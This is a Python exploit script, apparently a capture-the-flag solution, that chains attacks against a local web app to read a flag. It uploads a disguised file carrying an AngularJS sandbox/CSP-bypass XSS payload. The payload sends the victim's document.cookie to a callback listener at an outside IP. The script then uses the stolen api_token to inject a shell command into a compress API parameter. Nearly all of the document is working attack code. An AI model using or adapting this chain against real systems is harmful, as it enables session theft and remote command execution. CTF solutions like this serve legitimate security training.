import requests, json, re, threading, socket

URL = "http://localhost:1380"
LISTEN_PORT = 80
CALLBACK_URL = f"http://10.211.55.2:{LISTEN_PORT}"

r = requests.post(f"{URL}/upload", headers={
    'Host': 'localhost',
    'Content-Length': '248',
    'Cache-Control': 'max-age=0',
    'sec-ch-ua': '"Chromium";v="103", ".Not/A)Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'http://localhost',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryQA2tDP2dbYt1CmY5',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Referer': 'http://localhost/trial',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'close'
}, data="------WebKitFormBoundaryQA2tDP2dbYt1CmY5\r\nContent-Disposition: form-data; name=\"files\"; filename=\"trigger.SVG\"\r\nContent-Type: image/jpeg\r\n\r\n<html><body><script src=\"/public/cdn/tmlib.min.js\" integrity=\"sha256-nwtTA1EH0LF+Dgca7hMOrfzGQJx5yHOWv+YKiDXTD5k=\"></script><script src=\"/public/cdn/angular.js\" integrity=\"sha256-8TMrxW/W730TxIFfbDxM4Qmk6H9l+0+/k6VmZiyOqwo=\"></script><div ng-app ng-csp>{{[].clear.call().fetch(\""+CALLBACK_URL+"/?q=\"+[].clear.call().document.cookie)}}</div></body></html>\r\n------WebKitFormBoundaryQA2tDP2dbYt1CmY5--")

final_stage = r.text.split("File uploaded! <a href=\"")[1].split("\">View your upload here!<")[0]
print(f"Trigger uploaded to: {final_stage}")

class listen_thread(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        print("[Thread] Waiting for callback.")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("0.0.0.0", LISTEN_PORT))
            s.listen()
            
            conn, addr = s.accept()
            data = b""
            with conn:
                print(f"Connected by {addr}")
                data = conn.recv(1024)
                conn.sendall(b"")
        
        print(f"[Thread] Received: {data}")
       
        token = data.decode().split("api_token=")[1].split(" ")[0].strip()
        print(f"[Thread] Token = {token}")

        flag_regex = re.compile(r'WACTF{.*?}')
        attempt = 0

        while True:
            print(f"[Thread] Searching for flag...")
            r = requests.get(f"{URL}/api/v1/compress?query=%27;cat%20flag.txt)%23&api_token={token}")
            result = flag_regex.search(r.text)

            if result:
                print(result.group(0))
                exit(0)

            if attempt == 100:
                print("[Thread] Could not find flag?")
                exit(1)
            
            attempt += 1

print("Creating callback listener thread.")
lt = listen_thread()
lt.start()

print("Sending message.")
r = requests.post(f"{URL}/chat", headers={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
    'Accept': 'application/json',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'http://localhost:1380/',
    'Content-Type': 'application/json',
    'Origin': 'http://localhost:1380',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
}, data=json.dumps({"message":final_stage,"timestamp":"2022-11-8 9:18:29"}))

print(r.text)
lt.join()